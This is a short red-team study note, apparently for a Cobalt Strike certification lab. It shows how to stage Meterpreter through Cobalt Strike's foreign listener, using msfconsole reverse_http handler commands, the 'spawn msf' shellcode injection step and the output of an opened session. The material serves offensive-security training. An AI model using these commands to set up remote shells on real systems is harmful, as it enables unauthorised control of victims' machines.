
The foreign listener in Cobalt Strike is designed to stage Meterpreter HTTP/HTTPS implants from Beacon, although it's technically compatible with any implant that supports the MSF staging protocol.  

## 🖊️ Usage

1) Start `msfconsole` and create a new reverse HTTP Meterpreter listener.

```
attacker@ubuntu ~> sudo msfconsole -q
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST ens5
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > run

[*] Started HTTP reverse handler on http://10.10.5.50:8080
```

  You must use the "staged" reverse_http payload type and ensure you use a port that Cobalt Strike is not already listening on.
  
  2) Go to the listener management in Cobalt Strike and create a new **Foreign HTTP** listener.  The stager host and port must match your MSF multi handler.

![[foreign-http.png]]

3) This listener will now be available within all the relevant Beacon commands such as `spawn`, `jump` and `elevate`.  For instance, `spawn msf` will spawn a process and inject Meterpreter shellcode into it, thus giving us a Meterpreter session.

```
[*] http://10.10.5.50:8080 handling request from 10.10.122.254; (UUID: t6qekc2g) Staging x86 payload (176732 bytes) ...
[*] Meterpreter session 1 opened (10.10.5.50:8080 -> 127.0.0.1) at 2022-09-05 11:29:54 +0000

meterpreter > sysinfo
Computer        : WKSTN-2
OS              : Windows 10 (10.0 Build 19044).
Architecture    : x64
System Language : en_US
Domain          : DEV
Logged On Users : 11
Meterpreter     : x86/windows
```


###### ⚠ Two downsides to the foreign listener is that it only supports x86 staged payloads (no x64 or stageless).




### Properties
---
📆 created   {{14-02-2024}} 14:58
🏷️ tags: #redteam #crto 

---

